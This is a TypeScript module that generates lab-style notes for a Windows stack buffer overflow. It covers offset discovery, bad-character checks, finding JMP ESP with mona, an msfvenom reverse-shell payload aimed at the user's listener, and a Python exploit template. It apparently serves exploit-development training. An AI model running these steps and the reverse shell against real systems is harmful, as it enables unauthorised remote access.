import { cappedInt, hostOrIp, portNumber } from "./scope-target.ts";

export type BofStep = {
  id: string;
  title: string;
  look: string;
  command: string;
  alive: string;
  dead: string;
};

/** Copy-only notes. The desk does not send the exploit. */
export function bofSteps(lhost: string, lport: string, offset: string): { steps: BofStep[] } | { error: string } {
  const host = hostOrIp(lhost);
  if (!host) return { error: "LHOST is your tun0 address. No leading zeros." };
  const port = portNumber(lport);
  if (!port) return { error: "LPORT is 1 to 65535." };
  const off = cappedInt(offset || "0", 0, 5000);
  if (!off) return { error: "The offset is a number you got from pattern_offset, or 0 if you are not there yet." };
  const steps: BofStep[] = [
    {
      id: "spike",
      title: "Spike the input",
      look: "Send one long string of A at the field that crashed in the debugger. You are finding which input overflows, not fuzzing the whole program.",
      command: `python3 -c 'print("A"*200)'`,
      alive: "Immunity Debugger shows EIP as 41414141. That input is the one.",
      dead: "EIP is not 41414141. A longer string of the same character is the next try, not a second field.",
    },
    {
      id: "offset",
      title: "Find the offset",
      look: "pattern_create writes a unique string. pattern_offset tells you how many bytes land before EIP.",
      command: `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 800\n# after the crash, EIP value from Immunity goes here\n/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39654138 -l 800`,
      alive: "pattern_offset prints an exact match. That number is the offset.",
      dead: "No exact match. The pattern was too short, or you queried the wrong value. One longer pattern, then stop.",
    },
    {
      id: "badchars",
      title: "Bad characters",
      look: "Every byte from 01 to ff, in order. A missing or changed byte in the dump is bad. 00 is almost always bad.",
      command: `python3 - <<'PY'\nbad = b""\nfor i in range(1, 256):\n    bad += bytes([i])\nprint(bad)\nPY\n# Immunity: the dump starts after the offset. A truncated run means the first missing byte is bad.`,
      alive: "The dump stops or changes at one byte. Remove that byte and send the rest again.",
      dead: "The whole sequence is intact. The only bad character you know is 00. Move on.",
    },
    {
      id: "jmp",
      title: "Find JMP ESP",
      look: "mona in Immunity. A module without ASLR and without a null in the address.",
      command: `!mona modules\n!mona jmp -r esp -m MODULE.dll`,
      alive: "mona prints an address in a module that is not rebased. You write it in little endian.",
      dead: "Every module is rebased, or the address contains 00. You do not have a reliable jump yet.",
    },
    {
      id: "shell",
      title: "Shellcode",
      look: "msfvenom is allowed on every machine. This payload is a normal shell, not Meterpreter, unless you already locked Meterpreter to this host.",
      command: `msfvenom -p windows/shell_reverse_tcp LHOST=${host} LPORT=${port} -f python -b '\\x00' EXITFUNC=thread`,
      alive: "msfvenom prints a buf = byte string and a size. Bad characters you found go into -b as well.",
      dead: "The payload still contains a byte you marked bad. Add it to -b and generate once more.",
    },
    {
      id: "template",
      title: "Python template",
      look: "The offset, the JMP ESP address, a short NOP sled, then the buffer. You fill the address. The desk does not fill it for you.",
      command: `offset = ${off}\njmp_esp = b"\\x42\\x42\\x42\\x42"  # little endian, from mona\nnops = b"\\x90" * 16\nbuf = b""  # paste the msfvenom python buffer\npayload = b"A" * offset + jmp_esp + nops + buf\n# send payload to the same field that crashed`,
      alive: "The debugger lands in the NOP sled and the shell connects to your listener.",
      dead: "EIP is not your JMP ESP address. The offset or the endianness is wrong. Do not keep changing the shellcode.",
    },
  ];
  return { steps };
}
